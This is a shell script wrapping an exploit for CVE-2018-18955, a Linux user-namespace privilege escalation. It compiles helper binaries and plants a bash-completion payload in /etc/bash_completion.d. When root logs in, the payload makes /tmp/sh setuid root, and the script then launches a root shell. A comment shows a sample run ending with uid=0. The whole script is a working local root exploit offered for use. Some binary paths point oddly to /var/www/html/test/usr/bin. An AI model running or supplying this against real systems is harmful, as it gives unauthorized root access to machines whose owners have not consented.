#!/bin/sh
# wrapper for Jann Horn's exploit for CVE-2018-18955
# uses bash_completion technique
# ---
# test@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955$ ./exploit.bash_completion.sh 
# [*] Compiling...
# [*] Writing payload to /etc/bash_completion.d/subuid ...
# [.] starting
# [.] setting up namespace
# [~] done, namespace sandbox set up
# [.] mapping subordinate ids
# [.] subuid: 165536
# [.] subgid: 165536
# [~] done, mapped subordinate ids
# [.] executing subshell
# [*] Waiting for root user to login ...
# [+] Success:
# -rwsrwxr-x 1 root root 8384 Oct  4 13:46 /tmp/sh
# [*] Cleaning up...
# [*] Launching root shell: /tmp/sh
# root@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955# id
# uid=0(root) gid=0(root) groups=0(root),1001(test)

rootshell="/tmp/sh"
bootstrap="/etc/bash_completion.d/subuid"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  echo '[-] gcc is not installed'
  exit 1
fi

if ! command_exists /var/www/html/test/usr/bin/newuidmap; then
  echo '[-] newuidmap is not installed'
  exit 1
fi

if ! command_exists /var/www/html/test/usr/bin/newgidmap; then
  echo '[-] newgidmap is not installed'
  exit 1
fi

if ! test -w .; then
  echo '[-] working directory is not writable'
  exit 1
fi

echo "[*] Compiling..."

if ! gcc subuid_shell.c -o subuid_shell; then
  echo 'Compiling subuid_shell.c failed'
  exit 1
fi

if ! gcc subshell.c -o subshell; then
  echo 'Compiling gcc_subshell.c failed'
  exit 1
fi

if ! gcc rootshell.c -o "${rootshell}"; then
  echo 'Compiling rootshell.c failed'
  exit 1
fi

echo "[*] Writing payload to /etc/bash_completion.d/subuid ..."

echo "echo 'if [[ \$EUID -ne 0 ]]; then exit; fi; /bin/chown root:root ${rootshell};/bin/chmod u+s ${rootshell}; /bin/rm ${bootstrap}' > ${bootstrap}" | ./subuid_shell ./subshell

echo "[*] Waiting for root user to login ..."
while [ ! -u "${rootshell}" ];
do
  sleep 15;
done

echo '[+] Success:'
/bin/ls -la "${rootshell}"

echo '[*] Cleaning up...'
/bin/rm subuid_shell
/bin/rm subshell

echo "[*] Launching root shell: ${rootshell}"
$rootshell
